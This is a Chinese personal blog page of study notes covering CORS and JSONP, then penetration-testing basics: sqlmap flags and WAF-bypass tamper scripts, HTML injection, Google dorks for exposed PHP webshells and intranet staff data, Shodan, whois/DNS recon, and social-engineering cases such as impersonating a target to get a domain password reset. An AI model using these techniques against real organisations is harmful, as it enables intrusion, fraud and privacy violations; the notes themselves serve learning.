<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>暑假学习笔记记录 | Gridea</title>
<meta name="description" content="温故而知新">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1633574676036">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="stylesheet" href="https://unpkg.com/papercss@1.6.1/dist/paper.min.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">


<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>


<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />


  </head>
  <body>
  
    <nav class="navbar border fixed split-nav">
  <div class="nav-brand">
    <h3><a href="https://jinqipiaopiao.github.io/">Gridea</a></h3>
  </div>
  <div class="collapsible">
    <input id="collapsible1" type="checkbox" name="collapsible1">
    <button>
      <label for="collapsible1">
        <div class="bar1"></div>
        <div class="bar2"></div>
        <div class="bar3"></div>
      </label>
    </button>
    <div class="collapsible-body">
      <ul class="inline">
        
          <li>
            
              <a href="/" class="menu">
                首页
              </a>
            
          </li>
        
          <li>
            
              <a href="/archives" class="menu">
                归档
              </a>
            
          </li>
        
          <li>
            
              <a href="/tags" class="menu">
                标签
              </a>
            
          </li>
        
          <li>
            
              <a href="/post/about" class="menu">
                关于
              </a>
            
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div id="top" class="row site">
      <div class="sm-12 md-8 col">
        <div class="paper">
          <article class="article">
            <h1>暑假学习笔记记录</h1>
            <p class="article-meta">
              2021-07-06
              
            </p>
            
            <div class="post-content">
              <h1 id="2021-07-06">2021-07-06:</h1>
<h1 id="cors详解">CORS详解</h1>
<p>CORS是一个W3C标准，全称是跨域资源共享<br>
它允许浏览器向跨源夫区其发乎XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制<br>
一。简介<br>
CORS需要和浏览器和服务器同时支持，目前，所有浏览器都支持该功能，IE浏览器不能低于IE10<br>
整个CORS通信过程，都是刘阿龙年起自动完成，不需要用户参与，对于开发者来说，CORS同行与与同源的AJAX通信没有差别，代码完全一样，浏览器一旦法相ajax请求跨源，就会子哦对那个添加一些附加的头星系，有时还会多出一次附加的请求，但用户不会有感觉，<br>
因此实现cors通信的关键是服务器，只要服务器实现了cors接口，就可以实现跨源通信<br>
二。两种请求<br>
浏览器将cors请求分成两类，简单请求和非简单请求<br>
只要同时满足以下两大条件就属于简单请求<br>
1）请求方法是一下三种方法之一：<br>
HEAD<br>
GET<br>
POST<br>
2）HTTP的头信息不超过一下几种字段：<br>
Accept<br>
Accept-Language<br>
Content-Language<br>
Last-Event-ID<br>
Content-Type：只限于三个值application/x-www-form-urlencoded,multipart/form-data,text/plain<br>
这是为了兼容表单，因为历史上表单一直可以发出跨域请求，AJAX的跨域设计就是，只要表单可以发，AJAX就可以直接发<br>
凡是不满足两个条件的是属于非简单请求<br>
浏览器对这两种请求的处理，是不一样的<br>
三，简单请求<br>
3.1<strong>基本流程</strong><br>
对于简单请求，浏览器直接发出cors请求，具体来说，就是在头信息之中增加一个orign字段<br>
下面是一个例子，浏览器发现这次跨源AJAX请求时简单请求就自动在头信息之中添加一个Origin字段</p>
<pre><code>GET /cors HTTP/1.1
Origin: http://api.bob.com
Host: api.alice.com
Accept-Language: en-US
Connection: keep-alive
User-Agent: Mozilla/5.0...
</code></pre>
<p>上面的头信息中，Origin字段来说明本次请求来自哪个源（协议+域名+端口），服务器根据这个值来决定是否同意这次请求<br>
如果Origin指定的源，不子啊许可范围内，服务器就会返回一个正常的HTTP回应，浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段，就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获，这种错误无法通过状态之别，因为HTTP回应的状态码可能是200<br>
如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。</p>
<p>如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。</p>
<p>Access-Control-Allow-Origin: http://api.bob.com<br>
Access-Control-Allow-Credentials: true<br>
Access-Control-Expose-Headers: FooBar<br>
Content-Type: text/html; charset=utf-8<br>
上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。</p>
<p>（1）Access-Control-Allow-Origin</p>
<p>该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。</p>
<p>（2）Access-Control-Allow-Credentials</p>
<p>该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。</p>
<p>（3）Access-Control-Expose-Headers</p>
<p>该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader('FooBar')可以返回FooBar字段的值。</p>
<p>3.2 <strong>withCredentials 属性</strong><br>
上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。</p>
<p>Access-Control-Allow-Credentials: true<br>
另一方面，开发者必须在AJAX请求中打开withCredentials属性。</p>
<p>var xhr = new XMLHttpRequest();<br>
xhr.withCredentials = true;<br>
否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。</p>
<p>但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。</p>
<p>xhr.withCredentials = false;<br>
需要注意的是，如果要发送Cookie，Access-Control-Allow-Origin就不能设为星号，必须指定明确的、与请求网页一致的域名。同时，Cookie依然遵循同源政策，只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。</p>
<p>四、非简单请求<br>
<strong>4.1 预检请求</strong><br>
非简单请求是那种对服务器有特殊要求的请求，比如请求方法是PUT或DELETE，或者Content-Type字段的类型是application/json。</p>
<p>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为&quot;预检&quot;请求（preflight）。</p>
<p>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。</p>
<p>下面是一段浏览器的JavaScript脚本。</p>
<p>var url = 'http://api.alice.com/cors';<br>
var xhr = new XMLHttpRequest();<br>
xhr.open('PUT', url, true);<br>
xhr.setRequestHeader('X-Custom-Header', 'value');<br>
xhr.send();<br>
上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。</p>
<p>浏览器发现，这是一个非简单请求，就自动发出一个&quot;预检&quot;请求，要求服务器确认可以这样请求。下面是这个&quot;预检&quot;请求的HTTP头信息。</p>
<p>OPTIONS /cors HTTP/1.1<br>
Origin: http://api.bob.com<br>
Access-Control-Request-Method: PUT<br>
Access-Control-Request-Headers: X-Custom-Header<br>
Host: api.alice.com<br>
Accept-Language: en-US<br>
Connection: keep-alive<br>
User-Agent: Mozilla/5.0...<br>
&quot;预检&quot;请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。</p>
<p>除了Origin字段，&quot;预检&quot;请求的头信息包括两个特殊字段。</p>
<p>（1）Access-Control-Request-Method</p>
<p>该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。</p>
<p>（2）Access-Control-Request-Headers</p>
<p>该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。</p>
<p><strong>4.2 预检请求的回应</strong><br>
服务器收到&quot;预检&quot;请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。</p>
<p>HTTP/1.1 200 OK<br>
Date: Mon, 01 Dec 2008 01:15:39 GMT<br>
Server: Apache/2.0.61 (Unix)<br>
Access-Control-Allow-Origin: http://api.bob.com<br>
Access-Control-Allow-Methods: GET, POST, PUT<br>
Access-Control-Allow-Headers: X-Custom-Header<br>
Content-Type: text/html; charset=utf-8<br>
Content-Encoding: gzip<br>
Content-Length: 0<br>
Keep-Alive: timeout=2, max=100<br>
Connection: Keep-Alive<br>
Content-Type: text/plain<br>
上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。</p>
<p>Access-Control-Allow-Origin: *<br>
如果服务器否定了&quot;预检&quot;请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。</p>
<p>XMLHttpRequest cannot load http://api.alice.com.<br>
Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin.<br>
服务器回应的其他CORS相关字段如下。</p>
<p>Access-Control-Allow-Methods: GET, POST, PUT<br>
Access-Control-Allow-Headers: X-Custom-Header<br>
Access-Control-Allow-Credentials: true<br>
Access-Control-Max-Age: 1728000<br>
（1）Access-Control-Allow-Methods</p>
<p>该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次&quot;预检&quot;请求。</p>
<p>（2）Access-Control-Allow-Headers</p>
<p>如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在&quot;预检&quot;中请求的字段。</p>
<p>（3）Access-Control-Allow-Credentials</p>
<p>该字段与简单请求时的含义相同。</p>
<p>（4）Access-Control-Max-Age</p>
<p>该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。</p>
<p><strong>4.3 浏览器的正常请求和回应</strong><br>
一旦服务器通过了&quot;预检&quot;请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。</p>
<p>下面是&quot;预检&quot;请求之后，浏览器的正常CORS请求。</p>
<p>PUT /cors HTTP/1.1<br>
Origin: http://api.bob.com<br>
Host: api.alice.com<br>
X-Custom-Header: value<br>
Accept-Language: en-US<br>
Connection: keep-alive<br>
User-Agent: Mozilla/5.0...<br>
上面头信息的Origin字段是浏览器自动添加的。</p>
<p>下面是服务器正常的回应。</p>
<p>Access-Control-Allow-Origin: http://api.bob.com<br>
Content-Type: text/html; charset=utf-8<br>
上面头信息中，Access-Control-Allow-Origin字段是每次回应都必定包含的。</p>
<p>五、与JSONP的比较<br>
CORS与JSONP的使用目的相同，但是比JSONP更强大。</p>
<p>JSONP只支持GET请求，CORS支持所有类型的HTTP请求。JSONP的优势在于支持老式浏览器，以及可以向不支持CORS的网站请求数据。</p>
<h1 id="jsonp跨域原理解析">jsonp跨域原理解析</h1>
<p>背景：<br>
由于浏览器同源策略的限制，非同源下的请求，都会产生跨域问题，jsonp即是为了解决这个问题出现的一种简便解决方案。</p>
<p>同源策略即：同一协议，同一域名，同一端口号。当其中一个不满足时，我们的请求即会发生跨域问题。</p>
<p>举个简单的例子：</p>
<p>http://www.abc.com:3000到https://www.abc.com:3000的请求会出现跨域（域名、端口相同但协议不同）<br>
http://www.abc.com:3000到http://www.abc.com:3001的请求会出现跨域（域名、协议相同但端口不同）<br>
http://www.abc.com:3000到http://www.def.com:3000的请求会出现跨域（域名不同）<br>
突破同源策略限制：<br>
现在知道了同源策略，那我们就来看下jsonp是如何突破同源策略的限制实现跨域的</p>
<p>首先，不知道大家有没有注意，不管是我们的script标签的src还是img标签的src，或者说link标签的href他们没有被同源策略所限制，比如我们有可能使用一个网络上的图片，就可以请求得到</p>
<pre><code>&lt;img src=&quot;https://ss3.baidu.com/9fo3dSag_xI4khGko9WTAnF6hhy/image/h%3D300/sign=6d0bf83bda00baa1a52c41bb7711b9b1/0b55b319ebc4b745b19f82c1c4fc1e178b8215d9.jpg&quot;&gt;
</code></pre>
<p>src或href链接的静态资源，本质上来说也是一个get请求，拿csdn上的静态资源举例：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625536762106.png" alt="" loading="lazy"><br>
可以看到，确实是个get请求无疑。同理img标签的src和link标签的href也会发送一个get请求去请求静态资源。那么我们通过这点，是不是发现了点什么，这些标签的src和link属性，并没有受同源策略的限制。说到这里jsonp的实现原理就浮出水面了。</p>
<p>jsonp就是使用同源策略这一“漏洞”，实现的跨域请求（这也是jsonp跨域只能用get请求的原因所在）。想象一下，既然是个get请求，那么服务端一定可以接收到，并做出反馈。ok，知道这两点之后，我们开始具体使用jsonp进行跨域请求。</p>
<p>JSONP跨域实现：<br>
根据上边所说的，我们要用过利用srcipt标签的src属性来实现，那么我们如何做呢，我们来看一段简单的代码，为了方便，我这里使用jQuery：</p>
<pre><code>$('#btn').click(function(){
		var frame = document.createElement('script');
		frame.src = 'http://localhost:3000/article-list?name=leo&amp;age=30&amp;callback=func';
		$('body').append(frame);
	});
</code></pre>
<p>可以看到，让我们点击按钮的时候，创建了一个script标签(即会发送一个get请求到src指向的地址,注意：这里必须使用scipt标签，否则返回的数据不会被当作js执行)，src地址是&quot;localhost:3000/article-list&quot;,这个src地址，就是我们请求的服务端接口。注意，这里我们有是那个参数，name,age和callback，name和age不说了，这跟我们平时普通的get请求参数无异。主要说下callback这个参数，callback参数就是核心所在。为什么要定义callback呢？首先我们知道，这个get请求已经被发出去了，那么我们如何接口请求回来的数据呢，callback=func则可以帮我们做这件事。我们继续看下边的代码</p>
<pre><code>&lt;button id=&quot;btn&quot;&gt;点击&lt;/button&gt;
&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt;
&lt;script&gt;
$('#btn').click(function(){
var frame = document.createElement('script');
frame.src = 'http://localhost:3000/article-list?name=leo&amp;age=30&amp;callback=func';
$('body').append(frame);
});
    
function func(res){
alert(res.message+res.name+'你已经'+res.age+'岁了');
}
&lt;/script&gt;
</code></pre>
<p>这里可以看到，我们声明了一个func函数，但没有执行，你可以想一下，如果服务端接口到get请求，返回的是<code>func({message:'hello'})</code>，这样的话在服务端不就可以把数据通过函数执行传参的方式实现数据传递了吗。</p>
<p>服务端代码实现：<br>
接下来，我们看服务端应该如何实现：</p>
<pre><code>router.get('/article-list', (req, res) =&gt; {
console.log(req.query, '123');
let data = {
message: 'success!',
name: req.query.name,
age: req.query.age
}
data = JSON.stringify(data)
res.end('func(' + data + ')');
});
</code></pre>
<p>ok，接下来当我们点击提交的时候，就获取到了服务端反回的数据。如下：</p>
<p><img src="https://jinqipiaopiao.github.io//post-images/1625536769055.png" alt="" loading="lazy"><br>
这样下来，就完成了实现jsonp的跨域。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625536798447.png" alt="" loading="lazy"><br>
总结：<br>
需要注意的是，callback参数定义的方法是需要前后端定义好的，具体什么名字，商讨好就可以了。其实jsonp的整个过程就类似于前端声明好一个函数，后端返回执行函数。执行函数参数中携带所需的数据<br>
————————————————<br>
版权声明：本文为CSDN博主「机智的赵先生」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/badmoonc/article/details/82289252</p>
<h1 id="注入神器-sqlmap">注入神器 -SQLmap</h1>
<p>结合sqlmap 查询数据库：--dbs/--current-db 查询表：--tables/--tables-D 查询列：--dump-all/--dump-C-T-D<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625561849173.png" alt="" loading="lazy"><br>
<strong>tamper脚本</strong><br>
我们在下载好的SQLmap文件夹里可以找到文件夹tamper，其中该文件夹有44个脚本分别对57种WAF进行检测。例如360，绿盟WAF，modsecurity.，百度，fortiweb，cloudflare。由此可见老外对国内的WAF也是有了解的，可见他们也会悄悄对国内的WAF进行绕过。</p>
<p>其实一个简单的Tamper能够帮助我们修改Payload，修改请求头中的Header值，从而绕过IDS/WAF的检测。</p>
<p>这里的Payload就是指我们的每一个检测注入的SQL，在注入的时候我们可以加上-v 3参数来查看Payload。<br>
————————————————<br>
版权声明：本文为CSDN博主「是彻彻呀」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/Candyys/article/details/105892510<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625562721066.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625562724465.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625562728440.png" alt="" loading="lazy"></p>
<h1 id="html注入">HTML注入</h1>
<p>HTML注入有时也被称为虚拟污染。这实际是一个由站点造成的攻击，该站点允许恶意用户向其Web页面注入HTML，并且没有合理处理用户输入。换句话说，HTML注入漏洞是由网站接收HTML引起的，一般出现在网站页面的表单输入。</p>
<p>由于HTML是用于定义网页结构的语言，如果攻击者可以注入HTML，它们基本上可以改变浏览器呈现的内容。有时，这可能会导致页面外观的完全改变，或在其他情况下，创建表单来欺骗用户。例如，如果你可以注入HTML，你也许能够将&lt; form &gt;标签添加到页面，要求用户重新输入他们的用户名和密码。然而，当提交此表单时，它实际上将信息发送给了攻击者。<br>
————————————————<br>
版权声明：本文为CSDN博主「三体-二向箔」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
原文链接：https://blog.csdn.net/weixin_39157582/article/details/108157825</p>
<h1 id="2021-07-07">2021-07-07</h1>
<p><strong>渗透测试过程环节七大步</strong></p>
<p>前期交互阶段<br>
情报收集阶段<br>
威胁建模阶段<br>
漏洞分析阶段<br>
渗透攻击阶段<br>
后渗透攻击阶段POST<br>
报告阶段</p>
<p>前期交互阶段：与客户进行交互讨论，确定渗透测试范围，目标，限制条件以及服务合同等细节<br>
情报收集阶段：利用各种信息来源与搜索技术方法，尝试获取更多关于目标组织网络拓扑，系统配置与安全防御措施的信息<br>
威胁建模阶段：在收集到充分的信息进行威胁建模与攻击策划，确定出最可行的攻击通道<br>
漏洞分析阶段：找出可以渗透攻击的供给端，或者针对系统与服务进行安全漏洞探测与挖掘<br>
渗透攻击阶段：获取访问控制权<br>
后渗透攻击阶段：寻找客户组织最具价值和尝试安全保护的信息和资产，最终达成能够对客户组织造成最重要业务影响的攻击途径<br>
报告阶段：渗透测试的过程详细描述，以及修补与升级方案<br>
<img src="https://jinqipiaopiao.github.io//post-images/1625697651721.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625697656559.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1625697662431.png" alt="" loading="lazy"></p>
<p><strong>信息收集</strong></p>
<p>概念：黑客为了更加有效的实施攻击而在攻击前或攻击或成汇总对目标的所有探测活动<br>
目的：<br>
了解安全架构：信息收集使攻击者能够了解组织完整的安全架构<br>
缩小攻击范围：通过ip地址范围，网络，域名，元测化工你访问点等信息，可以缩小攻击范围<br>
建立信息数据库：攻击者能够建立他们自己的相关目标组织安全性弱点的信息数据库来采取下一次的入侵行动<br>
描绘网络拓扑：攻击者可以描绘出目标组织的网络拓扑图，分析最容易进入的攻击路径<br>
信息收集对于深渗透来说是非常重要的一步，手机的信息越详细对以后渗透测试的影响越大，毫不夸张地说，信息的收集决定着渗透的成功与否</p>
<p>分类：<br>
被动信息收集：被动信息收集也就是或不会与目标服务器做直接的交互，在不被目标系统察觉的情况下，通过搜索引擎，社交媒体等方式对目标外围的i西南西进行收集，例如网站的whois信息，DNS信息，管理员以及工作人员的个人信息等等<br>
主动信息收集：主动收集会与目标系统有直接的交互，从而得到目标系统相关的一些情报信息，例如：主机开发的端口，结构等等站点的目录</p>
<p>内容：<br>
网络信息：域名，内网域名，网段，授权可访问的IP地址，内部网络，开放的TCP、UDP端口，访问控制机制和ACL，运行的网络协议，VPN接入点，访问控制策略，运行的IDS监听策略模拟，数字段话号码认证机制，系统评估措施，防火墙等安全设施<br>
系统信息：用户和用户组名系统表示banner路由表，snmp信息，系统架构，远程系统类型，系统用户名，密码，站点目录，测试/临时文件<br>
组织信息：员工信息，组织网站，公司地址，位置详情，地址和电话号码，邮箱地址，HTML代码中的注释，实行的安全策略，与组织相关的web服务，组织的背景，发布的新闻</p>
<p>方法：<br>
搜索引擎，whois<br>
网站，DNS<br>
邮件，网络信息收集<br>
竞争情报，社会工程学<br>
Google，社交网站<br>
Google作为黑客工具，site指定域名，inurl：url中存在关键字的网页，intext：网页正文中的关键字，filetype：指定文件类型，intitle：网页标题中的关键字，link：baidu.com即表示返回所有和baidu.com做了来凝结的url，info：查找指定站点的一些基本信息，cache：搜索google里关于某些内容的缓存，site:edu.cn intext：后台管理<br>
intitle:&quot;php shell*&quot; &quot;Enable stderr&quot; filetype:php <br>
查找利用php webshell<br>
intitle—网页标题<br>
Enable stderr—UNIX标准输出和标准错误的缩写<br>
filetype—文件类型 <br>
intitle:intranet inurl:intranet+intext:”human resources”<br>
访问目标公司的私有网络和收集诸如员工列表、联系方式等敏感信息，这些是对于社会工程学来讲是非常有用的</p>
<p><strong>Shodan搜索引擎</strong></p>
<p>定义：是一个用于帮助发现主要的互联网系统漏洞（包括路由器，交换机工控系统等）的搜索引擎，它主要拦截从服务器到客户端的元数据来工作，目前提供查过50个端口的相关搜索</p>
<p>范围：服务器，路由器，交换机，公共ip的打印机，网络摄像头，加油站的泵，voip电话和所有数据采集监控系统</p>
<p>作用：用户搜索指定的项目，寻找端口并且拦截数据，为拦截的数据设置索引，显示结果</p>
<p>GOOGLE和SHODAN的区别：<br>
Google的爬虫、蜘蛛，抓取网页数据并且为网页内容创建索引，Shodan主要寻找端口并且抓取拦截到的信息，然后为他们建立索引，最后显示结果。shodan是一个基于拦截器的搜索引擎</p>
<h1 id="whois信息收集">whois信息收集</h1>
<p>whois（读作“Who is”，非缩写）是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。通过whois来实现对域名信息的查询。早期的whois查询多以命令列接口存在，但是现在出现了一些网页接口简化的线上查询工具，可以一次向不同的数据库查询。网页接口的查询工具仍然依赖whois协议向服务器发送查询请求，命令列接口的工具仍然被系统管理员广泛使用。whois通常使用TCP协议43端口。每个域名/IP的whois信息由对应的管理机构保存。</p>
<p>可以获取：域名详细信息，域名所有者的联系方式，域名服务器，网络ip地址范围，域名创建时间，过期记录，最近更新记录</p>
<p>作用绘制详细的网络拓扑图，收集可以用来进行社会工程学的个人信息，收集其他内网信息</p>
<h1 id="dns常用资源记录类型">DNS常用资源记录类型</h1>
<p>常用的资源记录类型<br>
A 地址 此记录列出特定主机名的 IP 地址。这是名称解析的重要记录。<br>
CNAME 标准名称 此记录指定标准主机名的别名。<br>
MX邮件交换器此记录列出了负责接收发到域中的电子邮件的主机。<br>
NS名称服务器此记录指定负责给定区域的名称服务器。<br>
PTR将IP地址映射到主机名</p>
<h1 id="dns查询">DNS查询</h1>
<p>收集子域名信息的理由：直接从主域入手显然是很不明智的选择。因为它一般是重点防护区域，所以不如先进入目标的某个子域，再想办法迂回接近真正的目标！</p>
<p>用于子域名检测的工具主要有： Layer子域名挖掘机、K8、wydomain、Sublist3r、dnsmaper、subDomainsBrute等。还可以用搜索引擎枚举，例如要搜索百度旗下的子域名就可以使用：<br>
site:baidu.com<br>
也可以利用一些网站来查子域名信息：  https://dnsdumpster.com       https://crt.sh    https://censys.io    子域名爆破网站：  https://phpinfo.me/domain      ip反查绑定域名网站:    http://dns.aizhan.com</p>
<p><strong>了解nslookup:</strong><br>
Nslookup 是一个用来查询Internet域名服务器基础结构的信息的程序。<br>
Nslookup有两种模式：交互式和非交互式。<br>
交互模式容许用户查询域名服务器，获取各种关于主机和域名的信息或输出一个域内的主机列表。<br>
非交互模式用于只输出一个主机或域名的名字和要求的信息。<br>
使用前提：<br>
Nslookup 必须要安装了TCP/IP 协议的网络环境之后才能使用。</p>
<p><strong>dig</strong>（域信息搜索器）命令是一个在类Unix命令行模式下用于询问 DNS 域名服务器的灵活的工具。它执行 DNS 搜索，显示从受请求的域名服务器返回的答复。多数 DNS 管理员利用 dig 作为 DNS 问题的故障诊断，因为它灵活性好、易用、输出清晰。虽然通常情况下 dig 使用命令行参数，但它也可以按批处理模式从文件读取搜索请求。</p>
<p>网络信息收集 - 确定网络地址范围<br>
http://www.networksolutions.com/whois/index.jsp</p>
<p>确定网络地址范围的作用：</p>
<p>网络范围信息可以协助攻击者绘制目标网络的拓扑图<br>
使用ARIN whois database search工具找到IP地址的范围<br>
可以通过区域因特网注册机构找到IP地址范围和目标组织使用子网掩码</p>
<h1 id="netcraft确定网站操作系统">netcraft确定网站操作系统</h1>
<p>Netcraft公司于1994年底在英国成立，多年来一直致力于互联网市场以及在线安全方面的咨询服务，其中在国际上最具影响力的当属其针对网站服务器，域名解析/主机提供商，以及SSL市场所做的客观严谨的分析研究。——来自百度百科。当然这个不是今天要介绍的，今天要介绍的是Netcraft下面的一些功能。这些功能为我们查询指定域名的网站的一些信息，于了解一个网站的信息还是非常有帮助的。比如：，网站使用技术，安全信息，IP地址，DNS等一系列信息。当然，如果你愿意，还可以监控这个网站的performance。OS及历史变更<br>
　　查询网站的一些基本信息的使用的方式也非常的简单。进入Netcraft官网，找到What's that site running?在搜索框中输入你需要查找的域名，网站将返回所有关于该域名下的域名信息列表（含服务器信息），如果想了解指定域名下的详细信息，只需要在Site Report那栏点击即可了解非常详细的信息。<br>
http://uptime.netcraft.com/up/graph</p>
<h1 id="社会工程学信息收集">社会工程学信息收集</h1>
<p>通过社交工程企图收集：<br>
信用卡信息和社保号<br>
用户名和密码<br>
其他个人信息<br>
使用的安全性产品<br>
操作系统和软件版本<br>
网络布置信息<br>
IP地址和服务器名</p>
<p>社交工程师使用的技术：<br>
窃听：窃听就是未被允许的偷听对话或读取信息<br>
拦截通讯信息，比如音频、视频或书写文档<br>
肩窥：监听就是攻击者在后面偷窥用户已获取重要信息的过程<br>
攻击者获取如密码、身份证号、账户密码、信用卡信息等<br>
垃圾搜索：垃圾搜索就是从某人的垃圾箱中寻找有用信息<br>
它包括从目标公司垃圾箱、打印机垃圾箱、用户桌面上的备注中收集电话账单、通讯信息、金融信息、相关业务等信息。<br>
在社交网络中模仿他人</p>
<p>社会工程学（Social Engineering）：<br>
一种通过对受害者心理弱点、本能反应、好奇心、信任、贪婪等心理陷阱进行诸如欺骗、伤害等危害手段取得自身利益的手法，已成迅速上升甚至滥用的趋势。那么，什么算是社会工程学呢？<br>
它并不能等同于一般的欺骗手法，社会工程学尤其复杂，即使自认为最警惕最小心的人，一样会被高明的社会工程学手段损害利益。<br>
社会工程学陷阱就是通常以交谈、欺骗、假冒或口语等方式，从合法用户中套取用户系统的秘密。<br>
社会工程学是一种与普通的欺骗和诈骗不同层次的手法。</p>
<p>社工库：是用社会工程学进行攻击时积累的各方数据的结构化数据库。<br>
CASE1: 给目标公司的销售人员发送邮件，假装对某个产品很感兴趣，显然销售人员会回复邮件。这样攻击者就可以通过分析邮件头来收集这家公司的真实IP地址及内部电子邮件服务器的相关信息。<br>
CASE2: 假设现在已经收集到了目标人物的邮箱、QQ、电话号码、姓名、以及域名服务商，也通过爆破或者撞库的方法获取了邮箱的密码，这时就可以冒充目标人物要求客服人员协助重置域管理密码，甚至技术人员会帮着重置密码，从而使攻击者拿下域管理控制台，然后做域劫持！</p>
<p>#社交网站信息收集：<br>
社交网络SNS<br>
理论来源：六度理论</p>
<p>SNS：专指在帮助人们建立社会性网络的互联网应用服务。也指社会现有已成熟普及的信息载体，如短信SMS服务。SNS的另一种常用解释：全称Social Network Site，即“社交网站”或“社交网”。<br>
六度分割理论：<br>
你和任何一个陌生人之间所间隔的人不会超过六个，也就是说，最多通过五个中间人你就能够认识任何一个陌生人。<br>
20世纪60年代，美国心理学家米尔格兰姆设计了一个连锁信件实验。米尔格兰姆把信随机发送给住在美国各城市的一部分居民，信中写有一个波士顿股票经纪人的名字，并要求每名收信人把这封信寄给自己认为是比较接近这名股票经纪人的朋友。这位朋友收到信后，再把信寄给他认为更接近这名股票经纪人的朋友。最终，大部分信件都寄到了这名股票经纪人手中，每封信平均经手6．2次到达。<br>
于是，米尔格兰姆提出六度分割理论，认为世界上任意两个人之间建立联系，最多只需要6个人。</p>
<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1625701752228.png" alt="" loading="lazy"></figure>
<p>#其它一些重要的信息收集工具和方法</p>
<p>NMAP，如：收集目标主机的端口使用信息<br>
指纹识别<br>
查找WEB站点的真实IP<br>
收集敏感目录文件：DirBuster,kali中的OWASP ZAP, http://www.webscan.cc/<br>
真正的目标WEB服务器，CDN服务器，</p>
